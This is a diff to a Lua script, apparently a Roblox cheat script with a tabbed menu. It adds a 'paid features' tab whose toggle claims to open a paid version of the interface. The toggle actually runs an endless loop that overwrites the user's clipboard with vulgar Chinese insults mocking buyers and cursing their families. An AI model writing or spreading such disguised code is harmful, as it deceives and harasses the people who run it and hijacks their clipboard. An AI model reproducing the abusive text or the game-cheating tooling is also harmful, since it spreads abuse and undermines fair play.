@@ -817,6 +817,52 @@ Tab:AddButton({
 })
 
 local Tab = Window:MakeTab({
+	Name = "付费功能",
+	Icon = "rbxassetid://7733960981",
+	PremiumOnly = false
+})
+
+_G.iwq = true
+ 
+function iwq()
+    while _G.iwq == true do
+    wait()
+setclipboard("傻逼东西免费脚本你还花钱买了哈哈哈我就给你个教训人傻钱多哈哈哈")    
+
+wait()
+setclipboard("傻逼东西免费脚本你还花钱买了哈哈哈我就给你个教训人傻钱多")    
+
+wait()
+setclipboard("傻逼废物孤儿东西免费脚本你还花钱买了哈哈哈我就给你个教训人傻钱多哈哈哈")    
+
+wait()
+setclipboard("傻逼窝囊废东西免费脚本你还花钱买了哈哈哈我就给你个教训人傻钱多哈哈哈")    
+
+wait()
+setclipboard("操你妈人傻钱多是不是死妈了哈哈哈哈")    
+
+wait()
+setclipboard("傻逼玩什么脚本回家种地去啊")    
+
+wait()
+setclipboard("我就操你妈了你有意见吗孤儿")    
+
+wait()
+setclipboard("隔着屏幕你来弄死我啊废物东西草泥马")    
+
+    end
+end 
+
+Tab:AddToggle({
+	Name = "打开付费版ui（请确定你是否是付费购买，否则后果自负）",
+	Default = false,
+	Callback = function(Value)
+	_G.iwq = Value
+		iwq()
+	end  
+})
+
+local Tab = Window:MakeTab({
 	Name = "公告",
 	Icon = "rbxassetid://7733960981",
 	PremiumOnly = false
